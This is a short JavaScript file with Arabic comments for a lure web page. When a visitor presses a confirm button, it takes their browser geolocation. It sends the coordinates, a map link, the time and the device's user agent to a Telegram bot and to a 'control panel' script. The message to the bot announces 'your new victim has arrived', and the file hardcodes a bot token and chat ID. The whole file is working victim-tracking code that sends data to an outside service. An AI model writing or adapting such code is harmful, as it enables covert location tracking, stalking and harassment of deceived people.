const telegramToken = "7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0";

// لما يضغط الزر
document.getElementById("confirm-btn").addEventListener("click", () => {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
  } else {
    alert("المتصفح لا يدعم تحديد الموقع");
  }
});

function sendLocation(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

  const userAgent = navigator.userAgent;
  const timestamp = new Date().toLocaleString();

  const message = `ضحيتك الجديدة وصلت: 
- الموقع: ${locationUrl}
- الوقت: ${timestamp}
- الجهاز: ${userAgent}`;

  // إرسال لتليجرام
  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: 6817512459,
      text: message
    })
  });

  // إرسال للسيرفر المحلي (لوحة التحكم)
  fetch("save.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      latitude,
      longitude,
      locationUrl,
      userAgent,
      timestamp
    })
  });
}

function handleError(error) {
  alert("فشل في تحديد الموقع");
  console.error(error);
}